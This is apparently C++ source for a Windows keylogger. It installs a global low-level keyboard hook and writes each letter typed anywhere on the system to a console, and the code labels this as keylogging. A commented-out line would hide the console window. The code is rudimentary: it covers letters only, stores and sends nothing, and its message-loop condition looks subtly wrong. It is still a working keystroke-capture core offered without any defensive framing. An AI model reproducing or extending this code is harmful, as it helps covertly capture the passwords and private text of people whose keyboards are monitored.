#include "stdafx.h"
#include <windows.h>
#include "axonUtil.h"
#include <string>
#include <sstream>
#include <iostream>
#include <cstdio>
using namespace std;

HHOOK hKeyboardHook;

#pragma region Kelogging
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	BOOL inKey = FALSE;
	DWORD SHIFT_key = 0;
	
	if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

		SHIFT_key = GetAsyncKeyState(VK_SHIFT);

		switch (p->vkCode)
		{
		case 0x41:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'a';
			else
				cout << 'A';
			break;
		case 0x42:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'b';
			else
				cout << 'B';
			break;
		case 0x43:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'c';
			else
				cout << 'C';
			break;
		case 0x44:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'd';
			else
				cout << 'D';
			break;
		case 0x45:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'e';
			else
				cout << 'E';
			break;
		case 0x46:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'f';
			else
				cout << 'F';
			break;
		case 0x47:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'g';
			else
				cout << 'G';
			break;
		case 0x48:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'h';
			else
				cout << 'H';
			break;
		case 0x49:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'i';
			else
				cout << 'I';
			break;
		case 0x4A:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'j';
			else
				cout << 'J';
			break;
		case 0x4B:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'k';
			else
				cout << 'K';
			break;
		case 0x4C:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'l';
			else
				cout << 'L';
			break;
		case 0x4D:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'm';
			else
				cout << 'M';
			break;
		case 0x4E:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'n';
			else
				cout << 'N';
			break;
		case 0x4F:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'o';
			else
				cout << 'O';
			break;
		case 0x50:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'p';
			else
				cout << 'P';
			break;
		case 0x51:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'q';
			else
				cout << 'Q';
			break;
		case 0x52:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'r';
			else
				cout << 'R';
			break;
		case 0x53:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 's';
			else
				cout << 'S';
			break;
		case 0x54:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 't';
			else
				cout << 'T';
			break;
		case 0x55:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'u';
			else
				cout << 'U';
			break;
		case 0x56:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'v';
			else
				cout << 'V';
			break;
		case 0x57:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'w';
			else
				cout << 'W';
			break;
		case 0x58:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'x';
			else
				cout << 'X';
			break;
		case 0x59:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'y';
			else
				cout << 'Y';
			break;
		case 0x5A:
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				cout << 'z';
			else
				cout << 'Z';
			break;
		}
	}
	return(inKey ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}
#pragma endregion

int main()
{	
	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);

	MSG msg;
	while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
		TranslateMessage(&msg);
		DispatchMessage(&msg);
		}
	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //Hides the console window
	

    return 0;
}

